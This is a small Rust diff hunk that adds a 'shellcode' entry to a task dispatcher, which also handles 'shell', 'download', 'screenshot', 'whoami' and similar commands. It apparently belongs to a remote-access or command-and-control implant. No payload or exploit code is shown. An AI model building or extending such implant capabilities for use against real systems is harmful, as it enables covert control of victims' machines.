@@ -32,7 +32,7 @@ pub async fn handle_task(
 
     match task {
         "cat" | "cd" | "download" | "info" | "ls" | "net" | "ps" | "pwd" |
-        "rm" | "screenshot" | "shell" | "sleep" | "whoami" => {
+        "rm" | "screenshot" | "shell" | "shellcode" | "sleep" | "whoami" => {
             match set_task(&args) {
                 Ok(_) => {},
                 Err(e) => {
